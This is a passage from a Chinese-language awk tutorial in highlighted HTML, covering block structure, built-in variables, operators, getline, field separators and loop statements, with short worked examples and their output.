i=0 }</span><span class=\"language-xml\"> </span><span class=\"hljs-template-variable\">{ i++ }</span><span class=\"language-xml\"> END</span><span class=\"hljs-template-variable\">{ print i }</span><span class=\"language-xml\">\" filename</span>\n</code></pre>\n<h3 id=\"awk的工作原理\">awk的工作原理</h3>\n<pre><code class=\"language-shell\"><span class=\"language-xml\">awk 'BEGIN</span><span class=\"hljs-template-variable\">{ commands }</span><span class=\"language-xml\"> pattern</span><span class=\"hljs-template-variable\">{ commands }</span><span class=\"language-xml\"> END</span><span class=\"hljs-template-variable\">{ commands }</span><span class=\"language-xml\">'</span>\n</code></pre>\n<ul>\n<li><p>  第一步：执行<code>BEGIN{ commands }</code>语句块中的语句；</p>\n</li>\n<li><p>  第二步：从文件或标准输入(stdin)读取一行，然后执行<code>pattern{ commands }</code>语句块，它逐行扫描文件，从第一行到最后一行重复这个过程，直到文件全部被读取完毕。</p>\n</li>\n<li><p>  第三步：当读至输入流末尾时，执行<code>END{ commands }</code>语句块。</p>\n</li>\n<li><p><em>BEGIN语句块</em>* 在awk开始从输入流中读取行 <strong>之前</strong> 被执行，这是一个可选的语句块，比如变量初始化、打印输出表格的表头等语句通常可以写在BEGIN语句块中。</p>\n</li>\n<li><p><em>END语句块</em>* 在awk从输入流中读取完所有的行 <strong>之后</strong> 即被执行，比如打印所有行的分析结果这类信息汇总都是在END语句块中完成，它也是一个可选语句块。</p>\n</li>\n<li><p><em>pattern语句块</em>* 中的通用命令是最重要的部分，它也是可选的。如果没有提供pattern语句块，则默认执行<code>{ print }</code>，即打印每一个读取到的行，awk读取的每一行都会执行该语句块。</p>\n</li>\n<li><p><em>示例</em>* </p>\n</li>\n</ul>\n<pre><code class=\"language-shell\">echo -<span class=\"hljs-keyword\">e</span> <span class=\"hljs-string\">\"A line 1\\nA line 2\"</span> | awk 'BEGIN{ <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"Start\"</span> } { <span class=\"hljs-keyword\">print</span> } END{ <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"End\"</span> }'\nStart\nA <span class=\"hljs-keyword\">line</span> 1\nA <span class=\"hljs-keyword\">line</span> 2\nEnd\n</code></pre>\n<p>当使用不带参数的<code>print</code>时，它就打印当前行，当<code>print</code>的参数是以逗号进行分隔时，打印时则以空格作为定界符。在awk的print语句块中双引号是被当作拼接符使用，例如：</p>\n<pre><code class=\"language-shell\">echo | awk '{ <span class=\"hljs-built_in\">var1</span>=<span class=\"hljs-string\">\"v1\"</span>; var2=<span class=\"hljs-string\">\"v2\"</span>; var3=<span class=\"hljs-string\">\"v3\"</span>; <span class=\"hljs-built_in\">print</span> <span class=\"hljs-built_in\">var1</span>,var2,var3; }' \nv1 v2 v3\n</code></pre>\n<p>双引号拼接使用：</p>\n<pre><code class=\"language-shell\">echo | awk '{ <span class=\"hljs-built_in\">var1</span>=<span class=\"hljs-string\">\"v1\"</span>; var2=<span class=\"hljs-string\">\"v2\"</span>; var3=<span class=\"hljs-string\">\"v3\"</span>; <span class=\"hljs-built_in\">print</span> <span class=\"hljs-built_in\">var1</span><span class=\"hljs-string\">\"=\"</span>var2<span class=\"hljs-string\">\"=\"</span>var3; }'\nv1=v2=v3\n</code></pre>\n<p>{ }类似一个循环体，会对文件中的每一行进行迭代，通常变量初始化语句（如：i=0）以及打印文件头部的语句放入BEGIN语句块中，将打印的结果等语句放在END语句块中。</p>\n<h2 id=\"awk内置变量（预定义变量）\">awk内置变量（预定义变量）</h2>\n<p>说明：[A][N][P][G]表示第一个支持变量的工具，[A]=awk、[N]=nawk、[P]=POSIXawk、[G]=gawk</p>\n<pre><code class=\"language-shell\"> <span class=\"hljs-strong\">**$n**</span>  当前记录的第n个字段，比如n为1表示第一个字段，n为2表示第二个字段。 \n <span class=\"hljs-strong\">**$0**</span>  这个变量包含执行过程中当前行的文本内容。\n[N]  <span class=\"hljs-strong\">**ARGC**</span>  命令行参数的数目。\n[G]  <span class=\"hljs-strong\">**ARGIND**</span>  命令行中当前文件的位置（从0开始算）。\n[N]  <span class=\"hljs-strong\">**ARGV**</span>  包含命令行参数的数组。\n[G]  <span class=\"hljs-strong\">**CONVFMT**</span>  数字转换格式（默认值为%.6g）。\n[P]  <span class=\"hljs-strong\">**ENVIRON**</span>  环境变量关联数组。\n[N]  <span class=\"hljs-strong\">**ERRNO**</span>  最后一个系统错误的描述。\n[G]  <span class=\"hljs-strong\">**FIELDWIDTHS**</span>  字段宽度列表（用空格键分隔）。\n[A]  <span class=\"hljs-strong\">**FILENAME**</span>  当前输入文件的名。\n[P]  <span class=\"hljs-strong\">**FNR**</span>  同NR，但相对于当前文件。\n[A]  <span class=\"hljs-strong\">**FS**</span>  字段分隔符（默认是任何空格）。\n[G]  <span class=\"hljs-strong\">**IGNORECASE**</span>  如果为真，则进行忽略大小写的匹配。\n[A]  <span class=\"hljs-strong\">**NF**</span>  表示字段数，在执行过程中对应于当前的字段数。\n[A]  <span class=\"hljs-strong\">**NR**</span>  表示记录数，在执行过程中对应于当前的行号。\n[A]  <span class=\"hljs-strong\">**OFMT**</span>  数字的输出格式（默认值是%.6g）。\n[A]  <span class=\"hljs-strong\">**OFS**</span>  输出字段分隔符（默认值是一个空格）。\n[A]  <span class=\"hljs-strong\">**ORS**</span>  输出记录分隔符（默认值是一个换行符）。\n[A]  <span class=\"hljs-strong\">**RS**</span>  记录分隔符（默认是一个换行符）。\n[N]  <span class=\"hljs-strong\">**RSTART**</span>  由match函数所匹配的字符串的第一个位置。\n[N]  <span class=\"hljs-strong\">**RLENGTH**</span>  由match函数所匹配的字符串的长度。\n[N]  <span class=\"hljs-strong\">**SUBSEP**</span>  数组下标分隔符（默认值是34）。\n</code></pre>\n<p>转义序列</p>\n<pre><code><span class=\"hljs-string\">\\\\</span> <span class=\"hljs-string\">\\自身</span>\n<span class=\"hljs-string\">\\$</span> 转义$\n<span class=\"hljs-string\">\\t</span> 制表符\n<span class=\"hljs-string\">\\b</span> 退格符\n<span class=\"hljs-string\">\\r</span> 回车符\n<span class=\"hljs-string\">\\n</span> 换行符\n<span class=\"hljs-string\">\\c</span> 取消换行\n</code></pre>\n<p><strong>示例</strong> </p>\n<pre><code class=\"language-shell\">echo -<span class=\"hljs-keyword\">e</span> <span class=\"hljs-string\">\"line1 f2 f3\\nline2 f4 f5\\nline3 f6 f7\"</span> | awk '{<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"Line No:\"</span>NR<span class=\"hljs-string\">\", No of fields:\"</span>NF, <span class=\"hljs-string\">\"$0=\"</span><span class=\"hljs-variable\">$0</span>, <span class=\"hljs-string\">\"$1=\"</span><span class=\"hljs-variable\">$1</span>, <span class=\"hljs-string\">\"$2=\"</span><span class=\"hljs-variable\">$2</span>, <span class=\"hljs-string\">\"$3=\"</span><span class=\"hljs-variable\">$3}</span>' \n<span class=\"hljs-keyword\">Line</span> <span class=\"hljs-keyword\">No</span>:1, <span class=\"hljs-keyword\">No</span> of fields:3 <span class=\"hljs-variable\">$0</span>=line1 f2 f3 <span class=\"hljs-variable\">$1</span>=line1 <span class=\"hljs-variable\">$2</span>=f2 <span class=\"hljs-variable\">$3</span>=f3\n<span class=\"hljs-keyword\">Line</span> <span class=\"hljs-keyword\">No</span>:2, <span class=\"hljs-keyword\">No</span> of fields:3 <span class=\"hljs-variable\">$0</span>=line2 f4 f5 <span class=\"hljs-variable\">$1</span>=line2 <span class=\"hljs-variable\">$2</span>=f4 <span class=\"hljs-variable\">$3</span>=f5\n<span class=\"hljs-keyword\">Line</span> <span class=\"hljs-keyword\">No</span>:3, <span class=\"hljs-keyword\">No</span> of fields:3 <span class=\"hljs-variable\">$0</span>=line3 f6 f7 <span class=\"hljs-variable\">$1</span>=line3 <span class=\"hljs-variable\">$2</span>=f6 <span class=\"hljs-variable\">$3</span>=f7\n</code></pre>\n<p>使用<code>print $NF</code>可以打印出一行中的最后一个字段，使用<code>$(NF-1)</code>则是打印倒数第二个字段，其他以此类推：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">echo</span> -e <span class=\"hljs-string\">\"line1 f2 f3\\n line2 f4 f5\"</span> | awk <span class=\"hljs-string\">'{print <span class=\"hljs-variable\">$NF</span>}'</span>\nf3\nf5\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"line1 f2 f3\\n line2 f4 f5\"</span> | awk <span class=\"hljs-string\">'{print $(NF-1)}'</span>\nf2\nf4\n</code></pre>\n<p>打印每一行的第二和第三个字段：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">awk</span> <span class=\"hljs-string\">'{ print <span class=\"hljs-variable\">$2</span>,<span class=\"hljs-variable\">$3</span> }'</span> filename\n</code></pre>\n<p>统计文件中的行数：</p>\n<pre><code class=\"language-shell\">awk '<span class=\"hljs-keyword\">END</span>{ <span class=\"hljs-keyword\">print</span> NR }' filename\n</code></pre>\n<p>以上命令只使用了END语句块，在读入每一行的时，awk会将NR更新为对应的行号，当到达最后一行NR的值就是最后一行的行号，所以END语句块中的NR就是文件的行数。</p>\n<p>一个每一行中第一个字段值累加的例子：</p>\n<pre><code class=\"language-shell\">seq 5 | awk 'BEGIN{ <span class=\"hljs-keyword\">sum</span>=0; <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"总和：\"</span> } { <span class=\"hljs-keyword\">print</span> <span class=\"hljs-variable\">$1</span><span class=\"hljs-string\">\"+\"</span>; <span class=\"hljs-keyword\">sum</span>+=<span class=\"hljs-variable\">$1</span> } END{ <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"等于\"</span>; <span class=\"hljs-keyword\">print</span> <span class=\"hljs-keyword\">sum</span> }' \n总和：\n1+\n2+\n3+\n4+\n5+\n等于\n15\n</code></pre>\n<h2 id=\"将外部变量值传递给awk\">将外部变量值传递给awk</h2>\n<p>借助 <strong><code>-v</code>选项</strong> ，可以将外部值（并非来自stdin）传递给awk：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">VAR</span>=10000\necho | awk -v <span class=\"hljs-attribute\">VARIABLE</span>=<span class=\"hljs-variable\">$VAR</span> <span class=\"hljs-string\">'{ print VARIABLE }'</span>\n</code></pre>\n<p>另一种传递外部变量方法：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">var1</span>=<span class=\"hljs-string\">\"aaa\"</span>\n<span class=\"hljs-attribute\">var2</span>=<span class=\"hljs-string\">\"bbb\"</span>\necho | awk <span class=\"hljs-string\">'{ print v1,v2 }'</span> <span class=\"hljs-attribute\">v1</span>=<span class=\"hljs-variable\">$var1</span> <span class=\"hljs-attribute\">v2</span>=<span class=\"hljs-variable\">$var2</span>\n</code></pre>\n<p>当输入来自于文件时使用：</p>\n<pre><code class=\"language-shell\">awk <span class=\"hljs-string\">'{ print v1,v2 }'</span> <span class=\"hljs-attribute\">v1</span>=<span class=\"hljs-variable\">$var1</span> <span class=\"hljs-attribute\">v2</span>=<span class=\"hljs-variable\">$var2</span> filename\n</code></pre>\n<p>以上方法中，变量之间用空格分隔作为awk的命令行参数跟随在BEGIN、{}和END语句块之后。</p>\n<h2 id=\"查找进程pid\">查找进程pid</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">netstat</span> -antup | grep <span class=\"hljs-number\">7770</span> | awk <span class=\"hljs-string\">'{ print <span class=\"hljs-variable\">$NF</span> NR}'</span> | awk <span class=\"hljs-string\">'{ print <span class=\"hljs-variable\">$1</span>}'</span>\n</code></pre>\n<h2 id=\"awk运算与判断\">awk运算与判断</h2>\n<p>作为一种程序设计语言所应具有的特点之一，awk支持多种运算，这些运算与C语言提供的基本相同。awk还提供了一系列内置的运算函数（如log、sqr、cos、sin等）和一些用于对字符串进行操作（运算）的函数（如length、substr等等）。这些函数的引用大大的提高了awk的运算功能。作为对条件转移指令的一部分，关系判断是每种程序设计语言都具备的功能，awk也不例外，awk中允许进行多种测试，作为样式匹配，还提供了模式匹配表达式<del>（匹配）和!</del>（不匹配）。作为对测试的一种扩充，awk也支持用逻辑运算符。</p>\n<h3 id=\"算术运算符\">算术运算符</h3>\n<table>\n<thead>\n<tr>\n<th>运算符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>+ -</td>\n<td>加，减</td>\n</tr>\n<tr>\n<td>* / &amp;</td>\n<td>乘，除与求余</td>\n</tr>\n<tr>\n<td>+ - !</td>\n<td>一元加，减和逻辑非</td>\n</tr>\n<tr>\n<td>^ ***</td>\n<td>求幂</td>\n</tr>\n<tr>\n<td>++ --</td>\n<td>增加或减少，作为前缀或后缀</td>\n</tr>\n</tbody></table>\n<p>例：</p>\n<pre><code class=\"language-shell\">awk <span class=\"hljs-symbol\">'BEGIN</span>{a=<span class=\"hljs-string\">\"b\"</span>;print a++,++a;}'\n<span class=\"hljs-number\">0</span> <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>注意：所有用作算术运算符进行操作，操作数自动转为数值，所有非数值都变为0</p>\n<h3 id=\"赋值运算符\">赋值运算符</h3>\n<table>\n<thead>\n<tr>\n<th>运算符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>= += -= *= /= %= ^= **=</td>\n<td>赋值语句</td>\n</tr>\n</tbody></table>\n<p>例：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">a</span>+=<span class=\"hljs-number\">5</span>; 等价于：<span class=\"hljs-keyword\">a</span>=<span class=\"hljs-keyword\">a</span>+<span class=\"hljs-number\">5</span>; 其它同类\n</code></pre>\n<h3 id=\"逻辑运算符\">逻辑运算符</h3>\n<table>\n<thead>\n<tr>\n<th>运算符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>||</code></td>\n<td>逻辑或</td>\n</tr>\n<tr>\n<td>&amp;&amp;</td>\n<td>逻辑与</td>\n</tr>\n</tbody></table>\n<p>例：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">awk</span> 'BEGIN{a=<span class=\"hljs-number\">1</span>;b=<span class=\"hljs-number\">2</span>;print (a&gt;<span class=\"hljs-number\">5</span> &amp;&amp; b&lt;=<span class=\"hljs-number\">2</span>),(a&gt;<span class=\"hljs-number\">5</span> || b&lt;=<span class=\"hljs-number\">2</span>);}'\n<span class=\"hljs-attribute\">0</span> <span class=\"hljs-number\">1</span>\n</code></pre>\n<h3 id=\"正则运算符\">正则运算符</h3>\n<table>\n<thead>\n<tr>\n<th>运算符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>~ !~</td>\n<td>匹配正则表达式和不匹配正则表达式</td>\n</tr>\n</tbody></table>\n<pre><code>^ 行首\n$ 行尾\n. 除了换行符以外的任意单个字符\n* 前导字符的零个或多个\n.* 所有字符\n<span class=\"hljs-selector-attr\">[]</span> 字符组内的任一字符\n<span class=\"hljs-selector-attr\">[^]</span>对字符组内的每个字符取反(不匹配字符组内的每个字符)\n^<span class=\"hljs-selector-attr\">[^]</span> 非字符组内的字符开头的行\n<span class=\"hljs-selector-attr\">[a-z]</span> 小写字母\n<span class=\"hljs-selector-attr\">[A-Z]</span> 大写字母\n<span class=\"hljs-selector-attr\">[a-Z]</span> 小写和大写字母\n<span class=\"hljs-selector-attr\">[0-9]</span> 数字\n\\&lt; 单词头单词一般以空格或特殊字符做分隔,连续的字符串被当做单词\n\\&gt; 单词尾\n</code></pre>\n<blockquote>\n<p>正则需要用 /正则/ 包围住</p>\n</blockquote>\n<p>例：</p>\n<pre><code class=\"language-shell\">awk <span class=\"hljs-symbol\">'BEGIN</span>{a=<span class=\"hljs-string\">\"100testa\"</span>;<span class=\"hljs-keyword\">if</span>(a ~ /^<span class=\"hljs-number\">100</span>*/){print <span class=\"hljs-string\">\"ok\"</span>;}}'\nok\n</code></pre>\n<h3 id=\"关系运算符\">关系运算符</h3>\n<table>\n<thead>\n<tr>\n<th>运算符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&lt; &lt;= &gt; &gt;= != ==</td>\n<td>关系运算符</td>\n</tr>\n</tbody></table>\n<p>例：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">awk</span> 'BEGIN{a=<span class=\"hljs-number\">11</span>;if(a &gt;= <span class=\"hljs-number\">9</span>){print <span class=\"hljs-string\">\"ok\"</span>;}}'\n<span class=\"hljs-attribute\">ok</span>\n</code></pre>\n<p>注意：&gt; &lt; 可以作为字符串比较，也可以用作数值比较，关键看操作数如果是字符串就会转换为字符串比较。两个都为数字才转为数值比较。字符串比较：按照ASCII码顺序比较。</p>\n<h3 id=\"其它运算符\">其它运算符</h3>\n<table>\n<thead>\n<tr>\n<th>运算符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>$</td>\n<td>字段引用</td>\n</tr>\n<tr>\n<td>空格</td>\n<td>字符串连接符</td>\n</tr>\n<tr>\n<td>?:</td>\n<td>C条件表达式</td>\n</tr>\n<tr>\n<td>in</td>\n<td>数组中是否存在某键值</td>\n</tr>\n</tbody></table>\n<p>例：</p>\n<pre><code class=\"language-shell\">awk <span class=\"hljs-symbol\">'BEGIN</span>{a=<span class=\"hljs-string\">\"b\"</span>;print a==<span class=\"hljs-string\">\"b\"</span>?<span class=\"hljs-string\">\"ok\"</span>:<span class=\"hljs-string\">\"err\"</span>;}'\nok\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">awk</span> 'BEGIN{a=<span class=\"hljs-string\">\"b\"</span>;arr[<span class=\"hljs-number\">0</span>]=<span class=\"hljs-string\">\"b\"</span>;arr[<span class=\"hljs-number\">1</span>]=<span class=\"hljs-string\">\"c\"</span>;print (a in arr);}'\n<span class=\"hljs-attribute\">0</span>\n</code></pre>\n<pre><code>awk <span class=\"hljs-symbol\">'BEGIN</span>{a=<span class=\"hljs-string\">\"b\"</span>;arr[<span class=\"hljs-number\">0</span>]=<span class=\"hljs-string\">\"b\"</span>;arr[<span class=\"hljs-string\">\"b\"</span>]=<span class=\"hljs-string\">\"c\"</span>;print (a <span class=\"hljs-keyword\">in</span> arr);}'\n<span class=\"hljs-number\">1</span>\n</code></pre>\n<h3 id=\"运算级优先级表\">运算级优先级表</h3>\n<p>!级别越高越优先<br>级别越高越优先</p>\n<h2 id=\"awk高级输入输出\">awk高级输入输出</h2>\n<h3 id=\"读取下一条记录\">读取下一条记录</h3>\n<p>awk中<code>next</code>语句使用：在循环逐行匹配，如果遇到next，就会跳过当前行，直接忽略下面语句。而进行下一行匹配。next语句一般用于多行合并：</p>\n<pre><code class=\"language-shell\">cat text<span class=\"hljs-selector-class\">.txt</span>\n<span class=\"hljs-selector-tag\">a</span>\n<span class=\"hljs-selector-tag\">b</span>\nc\nd\ne\n\nawk <span class=\"hljs-string\">'NR%2==1{next}{print NR,$0;}'</span> text<span class=\"hljs-selector-class\">.txt</span>\n<span class=\"hljs-number\">2</span> <span class=\"hljs-selector-tag\">b</span>\n<span class=\"hljs-number\">4</span> d\n</code></pre>\n<p>当记录行号除以2余1，就跳过当前行。下面的<code>print NR,$0</code>也不会执行。下一行开始，程序有开始判断<code>NR%2</code>值。这个时候记录行号是<code>：2</code> ，就会执行下面语句块：<code>'print NR,$0'</code></p>\n<p>分析发现需要将包含有“web”行进行跳过，然后需要将内容与下面行合并为一行：</p>\n<pre><code class=\"language-shell\">cat text.txt\nweb01[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.100</span>]\nhttpd            ok\ntomcat               ok\nsendmail               ok\nweb02[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.101</span>]\nhttpd            ok\npostfix               ok\nweb03[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.102</span>]\nmysqld            ok\nhttpd               ok\n<span class=\"hljs-number\">0</span>\nawk <span class=\"hljs-string\">'/^web/{T=$0;next;}{print T\":\"t,$0;}'</span> text.txt\nweb01[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.100</span>]:   httpd            ok\nweb01[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.100</span>]:   tomcat               ok\nweb01[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.100</span>]:   sendmail               ok\nweb02[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.101</span>]:   httpd            ok\nweb02[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.101</span>]:   postfix               ok\nweb03[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.102</span>]:   mysqld            ok\nweb03[<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">2.102</span>]:   httpd               ok\n</code></pre>\n<h3 id=\"简单地读取一条记录\">简单地读取一条记录</h3>\n<p><code>awk getline</code>用法：输出重定向需用到<code>getline函数</code>。getline从标准输入、管道或者当前正在处理的文件之外的其他输入文件获得输入。它负责从输入获得下一行的内容，并给NF,NR和FNR等内建变量赋值。如果得到一条记录，getline函数返回1，如果到达文件的末尾就返回0，如果出现错误，例如打开文件失败，就返回-1。</p>\n<p>getline语法：getline var，变量var包含了特定行的内容。</p>\n<p>awk getline从整体上来说，用法说明：</p>\n<ul>\n<li><strong>当其左右无重定向符<code>|</code>或<code>&lt;</code>时：</strong> getline作用于当前文件，读入当前文件的第一行给其后跟的变量<code>var</code>或<code>$0</code>（无变量），应该注意到，由于awk在处理getline之前已经读入了一行，所以getline得到的返回结果是隔行的。</li>\n<li><strong>当其左右有重定向符<code>|</code>或<code>&lt;</code>时：</strong> getline则作用于定向输入文件，由于该文件是刚打开，并没有被awk读入一行，只是getline读入，那么getline返回的是该文件的第一行，而不是隔行。</li>\n</ul>\n<p><strong>示例：</strong> </p>\n<p>执行linux的<code>date</code>命令，并通过管道输出给<code>getline</code>，然后再把输出赋值给自定义变量out，并打印它：</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{ <span class=\"hljs-string\">\"date\"</span> | getline <span class=\"hljs-keyword\">out</span>; <span class=\"hljs-keyword\">print</span> <span class=\"hljs-keyword\">out</span> }' <span class=\"hljs-keyword\">test</span>\n</code></pre>\n<p>执行shell的date命令，并通过管道输出给getline，然后getline从管道中读取并将输入赋值给out，split函数把变量out转化成数组mon，然后打印数组mon的第二个元素：</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{ <span class=\"hljs-string\">\"date\"</span> | getline <span class=\"hljs-keyword\">out</span>; <span class=\"hljs-keyword\">split</span>(<span class=\"hljs-keyword\">out</span>,mon); <span class=\"hljs-keyword\">print</span> mon[2] }' <span class=\"hljs-keyword\">test</span>\n</code></pre>\n<p>命令ls的输出传递给geline作为输入，循环使getline从ls的输出中读取一行，并把它打印到屏幕。这里没有输入文件，因为BEGIN块在打开输入文件前执行，所以可以忽略输入文件。</p>\n<pre><code class=\"language-shell\">awk <span class=\"hljs-symbol\">'BEGIN</span>{ <span class=\"hljs-keyword\">while</span>( <span class=\"hljs-string\">\"ls\"</span> | getline) print }'\n</code></pre>\n<h3 id=\"关闭文件\">关闭文件</h3>\n<p>awk中允许在程序中关闭一个输入或输出文件，方法是使用awk的close语句。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">close</span><span class=\"hljs-params\">(<span class=\"hljs-string\">\"filename\"</span>)</span></span>\n</code></pre>\n<p>filename可以是getline打开的文件，也可以是stdin，包含文件名的变量或者getline使用的确切命令。或一个输出文件，可以是stdout，包含文件名的变量或使用管道的确切命令。</p>\n<h3 id=\"输出到一个文件\">输出到一个文件</h3>\n<p>awk中允许用如下方式将结果输出到一个文件：</p>\n<pre><code class=\"language-shell\">echo <span class=\"hljs-string\">| awk '{printf(\"</span>hello word!n<span class=\"hljs-string\">\") &gt; \"</span>datafile<span class=\"hljs-string\">\"}'</span>\n<span class=\"hljs-meta\"># 或</span>\necho <span class=\"hljs-string\">| awk '{printf(\"</span>hello word!n<span class=\"hljs-string\">\") &gt;&gt; \"</span>datafile<span class=\"hljs-string\">\"}'</span>\n</code></pre>\n<h2 id=\"设置字段定界符\">设置字段定界符</h2>\n<p>默认的字段定界符是空格，可以使用<code>-F \"定界符\"</code>  明确指定一个定界符：</p>\n<pre><code class=\"language-shell\">awk -F: <span class=\"hljs-string\">'{ print $NF }'</span> <span class=\"hljs-regexp\">/etc/</span>passwd\n<span class=\"hljs-comment\"># 或</span>\nawk <span class=\"hljs-string\">'BEGIN{ FS=\":\" } { print $NF }'</span> <span class=\"hljs-regexp\">/etc/</span>passwd\n</code></pre>\n<p>在<code>BEGIN语句块</code>中则可以用<code>OFS=“定界符”</code>设置输出字段的定界符。</p>\n<h2 id=\"流程控制语句\">流程控制语句</h2>\n<p>在linux awk的while、do-while和for语句中允许使用break,continue语句来控制流程走向，也允许使用exit这样的语句来退出。break中断当前正在执行的循环并跳到循环外执行下一条语句。if 是流程选择用法。awk中，流程控制语句，语法结构，与c语言类型。有了这些语句，其实很多shell程序都可以交给awk，而且性能是非常快的。下面是各个语句用法。</p>\n<h3 id=\"条件判断语句\">条件判断语句</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">if</span><span class=\"hljs-params\">(表达式)</span></span>\n  语句<span class=\"hljs-number\">1</span>\n<span class=\"hljs-keyword\">else</span>\n  语句<span class=\"hljs-number\">2</span>\n</code></pre>\n<p>格式中语句1可以是多个语句，为了方便判断和阅读，最好将多个语句用{}括起来。awk分枝结构允许嵌套，其格式为：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">if</span>(表达式)</span>\n  {语句<span class=\"hljs-number\">1</span>}\n<span class=\"hljs-variable\"><span class=\"hljs-keyword\">else</span></span> <span class=\"hljs-function\"><span class=\"hljs-title\">if</span>(表达式)</span>\n  {语句<span class=\"hljs-number\">2</span>}\n<span class=\"hljs-variable\"><span class=\"hljs-keyword\">else</span></span>\n  {语句<span class=\"hljs-number\">3</span>}\n</code></pre>\n<p>示例：</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{\n<span class=\"hljs-keyword\">test</span>=100;\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">test</span>&gt;90){\n  <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"very good\"</span>;\n  }\n  <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">test</span>&gt;60){\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"good\"</span>;\n  }\n  <span class=\"hljs-keyword\">else</span>{\n    <span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"no pass\"</span>;\n  }\n}'\n\nvery good\n</code></pre>\n<p>每条命令语句后面可以用<code>;</code> <strong>分号</strong> 结尾。</p>\n<h3 id=\"循环语句\">循环语句</h3>\n<h3 id=\"-while语句\"># while语句</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">while</span><span class=\"hljs-params\">(表达式)</span></span>\n  {语句}\n</code></pre>\n<p>示例：</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{\n<span class=\"hljs-keyword\">test</span>=100;\n<span class=\"hljs-keyword\">total</span>=0;\n<span class=\"hljs-keyword\">while</span>(i&lt;=<span class=\"hljs-keyword\">test</span>){\n  <span class=\"hljs-keyword\">total</span>+=i;\n  i++;\n}\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-keyword\">total</span>;\n}'\n5050\n</code></pre>\n<h3 id=\"-for循环\"># for循环</h3>\n<p>for循环有两种格式：</p>\n<p>格式1：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">for</span><span class=\"hljs-params\">(变量 in 数组)</span></span>\n  {语句}\n</code></pre>\n<p>示例：</p>\n<pre><code class=\"language-shell\">awk <span class=\"hljs-string\">'BEGIN{\nfor(k in ENVIRON){\n  print k\"=\"ENVIRON[k];\n}\n\n}'</span>\n<span class=\"hljs-attribute\">TERM</span>=linux\n<span class=\"hljs-attribute\">G_BROKEN_FILENAMES</span>=1\n<span class=\"hljs-attribute\">SHLVL</span>=1\n<span class=\"hljs-attribute\">pwd</span>=/root/text\n<span class=\"hljs-built_in\">..</span>.\n<span class=\"hljs-attribute\">logname</span>=root\n<span class=\"hljs-attribute\">HOME</span>=/root\n<span class=\"hljs-attribute\">SSH_CLIENT</span>=192.168.1.21 53087 22\n</code></pre>\n<p>注：ENVIRON是awk常量，是子典型数组。</p>\n<p>格式2：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">for</span><span class=\"hljs-params\">(变量;条件;表达式)</span></span>\n  {语句}\n</code></pre>\n<p>示例：</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{\n<span class=\"hljs-keyword\">total</span>=0;\n<span class=\"hljs-keyword\">for</span>(i=0;i&lt;=100;i++){\n  <span class=\"hljs-keyword\">total</span>+=i;\n}\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-keyword\">total</span>;\n}'\n5050\n</code></pre>\n<h3 id=\"-do循环\"># do循环</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">do</span>\n{语句} <span class=\"hljs-keyword\">while</span><span class=\"hljs-comment\">(条件)</span>\n</code></pre>\n<p>例子：</p>\n<pre><code class=\"language-shell\">awk 'BEGIN{ \n<span class=\"hljs-keyword\">total</span>=0;\ni=0;\n<span class=\"hljs-keyword\">do</span> {<span class=\"hljs-keyword\">total</span>+=i;i++;} <span class=\"hljs-keyword\">while</span>(i&lt;=100)\n  <span class=\"hljs-keyword\">print</span> <span class=\"hljs-keyword\">total</span>;\n}'\n5050\n</code></pre>\n<h3 